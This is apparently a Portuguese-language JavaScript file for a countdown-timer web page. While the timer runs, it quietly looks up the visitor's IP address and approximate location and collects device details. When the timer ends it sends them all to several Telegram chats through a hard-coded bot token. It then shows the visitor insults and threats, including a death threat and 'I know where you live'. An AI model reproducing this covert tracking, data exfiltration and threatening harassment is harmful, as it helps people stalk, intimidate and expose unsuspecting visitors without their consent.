// script.js - Envio para MÚLTIPLOS usuários no Telegram

let targetDate = new Date("2026-04-20T02:32:59").getTime();
let userIPv4 = '';
let userLatitude = '';
let userLongitude = '';
let timerInterval = null;
let alreadySent = false;

// ==================== CONFIGURAÇÃO DE DESTINATÁRIOS ====================
const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

// Coloque aqui todos os chat_id que devem receber a mensagem
const CHAT_IDS = [
    "8448614204",        // Seu ID (você)
    "8219025301",   // Luizz
    // "1234567890",     // terceiro
    // "9876543210"      // quarto, etc...
];

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType: deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio || 1,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram,
        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };
}

// ==================== ENVIA PARA TODOS OS CHAT_IDS ====================
function sendToTelegram() {
    if (alreadySent) return;
    alreadySent = true;

    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
                    `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                    `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Idioma: ${device.language}\n` +
                    `• Fuso horário: ${device.timezone}\n` +
                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                    `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
                    `===================================\n` +
                    `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n\n` +
                    `Eu sei que você tá usando essa merda de ${devType}.\n` +
                    `Eu sei onde você mora.\n` +
                    `Eu sei qual IP de merda é esse.\n\n` +
                    `Você não passa de um fracassado inútil.\n` +
                    `Perdedor de merda.\n\n` +
                    `Não é magia, é habilidade isto...`;

    // Envia para TODOS os chat_ids
    CHAT_IDS.forEach(chatId => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: message 
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
                console.log(`✅ Mensagem enviada para chat_id: ${chatId}`);
            } else {
                console.error(`❌ Erro ao enviar para ${chatId}:`, data.description);
            }
        })
        .catch(err => console.error(`Erro ao enviar para ${chatId}:`, err));
    });
}

// ==================== MENSAGEM NA TELA ====================
function showFinalMessageOnScreen() {
    const deviceType = detectDeviceType();
    
    document.getElementById("timer").innerHTML = `
        Tempo esgotado!<br><br>
        Prepare-se para morrer, seu lixo...<br><br>
        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
        Eu sei onde você mora.<br>
        Eu sei o seu IP.<br><br>
        Você é um fracassado patético.<br>
        Um inútil.<br>
        Um perdedor que não consegue nem ganhar de um timer.<br><br>
        Não é magia, é habilidade isto...<br>
        <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
    `;
}

function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);
        showFinalMessageOnScreen();
        sendToTelegram();
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

// Busca IP + Localização
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        userIPv4 = data.ip;
        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,lat,lon`);
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === "success") {
            userLatitude = data.lat || '';
            userLongitude = data.lon || '';
        }
    })
    .catch(err => console.error("Erro na localização:", err));

timerInterval = setInterval(updateTimer, 100);
updateTimer();